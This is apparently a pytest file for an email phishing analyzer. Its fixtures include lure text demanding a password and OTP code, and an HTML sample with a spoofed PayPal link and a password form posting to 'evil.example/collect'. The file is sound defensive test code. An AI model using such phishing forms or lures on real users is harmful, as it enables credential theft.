from __future__ import annotations

from app.modules.content_analysis.analyzer import analyze
from app.schemas.enums import AnalysisStatus
from tests.helpers import context, make_email


def types(result) -> set[str]:
    return {item.type for item in result.findings}


async def test_detects_social_engineering_language():
    result = await analyze(
        make_email(
            subject="Urgent: verify your account",
            body_text=(
                "Your account will be suspended. Verify your password immediately. "
                "Send the OTP code to continue."
            ),
        ),
        context(),
    )
    found = types(result)
    assert result.status == AnalysisStatus.COMPLETED
    assert "urgency_language" in found
    assert "account_suspension" in found
    assert "credential_request" in found
    assert "otp_request" in found


async def test_detects_password_form_hidden_content_and_anchor_mismatch():
    html = """
    <html><body>
      <div style="display:none">hidden bait</div>
      <a href="https://evil.example/login">https://www.paypal.com/login</a>
      <form action="https://evil.example/collect" method="post">
        <input type="password" name="password" />
      </form>
    </body></html>
    """
    result = await analyze(make_email(body_text="", body_html=html), context())
    found = types(result)
    assert "hidden_html_content" in found
    assert "anchor_text_mismatch" in found
    assert "password_form" in found
    assert result.data["password_inputs"] == 1


async def test_clean_message_has_no_findings():
    result = await analyze(
        make_email(subject="Quarterly report", body_text="Please find the report attached."),
        context(),
    )
    assert result.findings == []


async def test_empty_message_is_reported():
    result = await analyze(make_email(subject="", body_text="", body_html=None), context())
    assert "empty_content" in types(result)


async def test_evidence_is_truncated_and_present():
    result = await analyze(
        make_email(body_text="Your account will be suspended immediately."), context()
    )
    for item in result.findings:
        assert item.evidence is None or len(item.evidence) <= 300
